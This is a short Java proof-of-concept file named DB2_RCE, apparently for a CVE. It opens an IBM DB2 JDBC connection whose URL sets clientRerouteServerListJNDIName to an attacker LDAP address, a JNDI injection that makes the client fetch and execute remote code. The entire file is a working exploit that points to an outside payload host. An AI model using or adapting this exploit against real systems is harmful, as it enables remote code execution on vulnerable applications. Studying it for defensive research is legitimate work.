package cve;

import java.sql.DriverManager;
import java.sql.SQLException;

public class DB2_RCE {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://192.168.26.1:1389/t8rs64;");
    }
}
